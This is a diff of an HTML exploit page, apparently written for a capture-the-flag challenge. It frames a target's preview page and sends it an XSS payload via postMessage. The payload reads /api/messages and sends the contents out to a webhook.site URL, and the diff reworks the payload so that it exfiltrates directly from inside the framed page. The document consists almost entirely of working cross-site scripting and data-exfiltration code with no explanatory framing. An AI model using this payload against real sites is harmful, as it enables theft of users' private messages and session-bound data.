@@ -1,22 +1,17 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <body>
+<iframe id="f" src="https://c4be5b24-6c1f-4885-92bf-8881add9a1bd.offsec.m0lecon.it/preview"></iframe>
 <script>
-window.addEventListener(`message`, function(e) {
-  if (e.data && e.data.data) {
-    fetch(`https://webhook.site/4fdd6758-a9a4-4aeb-9322-bc636b2e24ed?d=`+encodeURIComponent(e.data.data));
-  }
-});
-
-window.onload = function() {
-  var iframe = document.getElementById(`f`);
-  iframe.onload = function() {
-    iframe.contentWindow.postMessage({
-      html: `<img src=x onerror="fetch(\`/api/messages\`).then(r=>r.text()).then(t=>parent.postMessage({data:t},\`*\`))">`
-    }, `*`);
-  };
+const WEBHOOK = "https://webhook.site/4fdd6758-a9a4-4aeb-9322-bc636b2e24ed";
+const payload = `<img src=x onerror="
+  fetch('/api/messages').then(r=>r.text()).then(t=>
+    fetch('${WEBHOOK}?d='+encodeURIComponent(t), {mode:'no-cors'})
+  )
+">`;
+document.getElementById('f').onload = function() {
+  document.getElementById('f').contentWindow.postMessage({ html: payload }, '*');
 };
 </script>
-<iframe id="f" src="https://35de0802-c815-42a6-b9aa-7344ba749b0a.offsec.m0lecon.it/preview"></iframe>
 </body>
 </html>
